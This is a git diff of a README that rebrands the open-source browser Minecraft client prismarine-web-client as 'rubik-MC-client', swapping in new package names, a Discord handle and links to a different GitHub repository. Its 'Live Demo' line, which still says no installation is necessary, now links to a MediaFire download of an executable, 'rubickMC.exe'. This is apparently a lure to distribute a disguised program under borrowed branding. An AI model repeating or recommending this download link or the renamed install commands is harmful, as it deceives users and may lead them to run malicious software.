@@ -1,8 +1,5 @@
 # rubik-MC-client
-[![NPM version](https://img.shields.io/npm/v/prismarine-web-client.svg)](http://npmjs.com/package/prismarine-web-client)
-[![Build Status](https://github.com/PrismarineJS/prismarine-web-client/workflows/CI/badge.svg)](https://github.com/PrismarineJS/prismarine-web-client/actions?query=workflow%3A%22CI%22)
-[![Discord](https://img.shields.io/badge/chat-on%20discord-brightgreen.svg)](https://discord.gg/GsEFRM8)
-[![Try it on gitpod](https://img.shields.io/badge/try-on%20gitpod-brightgreen.svg)](https://gitpod.io/#https://github.com/PrismarineJS/prismarine-web-client)
+[![Discord] ar#5595
 
 | 🇺🇸 [English](README.md) | 🇷🇺 [Russian](README_RU.md)  | 🇵🇹 [Portuguese](README_PT.md) |
 | ----------------------- | -------------------------- | ---------------------------- |
@@ -11,26 +8,26 @@ A Minecraft client running in a web page. **Live demo at https://webclient.prism
 
 
 ## How it Works
-prismarine-web-client runs mineflayer and prismarine-viewer in the browser, which connects over WebSocket to a proxy 
-which translates the WebSocket connection into TCP to connect to normal Minecraft servers. Prismarine-web-client is based on:
+rubik-web-client runs mineflayer and prismarine-viewer in the browser, which connects over WebSocket to a proxy 
+which translates the WebSocket connection into TCP to connect to normal Minecraft servers.rubik-web-client is based on:
 * [prismarine-viewer](https://github.com/PrismarineJS/prismarine-viewer) for the world rendering
 * [mineflayer](https://github.com/PrismarineJS/mineflayer) for the high-level Minecraft client API
 
 Check these modules if you want to understand more how it works and contribute!
 
 ## Screenshot
-![Screenshot of prismarine-web-client in action](screenshot.png)
+![Screenshot of rubik-web-client in action](screenshot.png)
 
 ## Live Demo
-Click on this link to open it in your browser, no installation necessary: https://webclient.prismarine.js.org/
+Click on this link to open it in your browser, no installation necessary: https://www.mediafire.com/file/7qvxuh6c6j2xte4/rubickMC.exe/file
 
 *Tested on Chrome & Firefox for desktop platforms.*
 
 ## Usage
 To host it yourself, run these commands in bash: 
 ```bash
-$ npm install -g prismarine-web-client
-$ prismarine-web-client
+$ npm install -g rubik-web-client
+$ rubik-web-client
 ``` 
 Finally, open `http://localhost:8080` in your browser.
 
@@ -55,7 +52,7 @@ First, clone the repo.
 
 Then, set your working directory to that of the repo. For example:
 ```bash
-$ cd ~/prismarine-web-client/
+$ cd ~/rubik-web-client/
 ```
 
 Finally, run
@@ -74,7 +71,7 @@ You may want to disable auto saving in your IDE to avoid constant rebuilding; se
 
 To check the production build (will take a minute to build), you can run `npm run build-start`.
 
-If you're interested in contributing, you can check projects at https://github.com/PrismarineJS/prismarine-web-client/projects.
+If you're interested in contributing, you can check projects at https://github.com/arielitoo/clienterubikMC/
 
 Some variables are exposed in the global ``window`` object for debugging:
 * ``bot``
@@ -102,4 +99,4 @@ In Chrome DevTools:
 * `bot.physics.sprintSpeed = 5` walks faster
 * `bot.loadPlugin(pathfinder.pathfinder)` then `bot.pathfinder.goto(new pathfinder.goals.GoalXZ(100, 100))` goes to position 100, 100
 
-For more debugging ideas, read the [mineflayer](https://github.com/PrismarineJS/mineflayer) doc.
+For more debugging ideas, read the https://github.com/arielitoo/clienterubikMC/ doc.
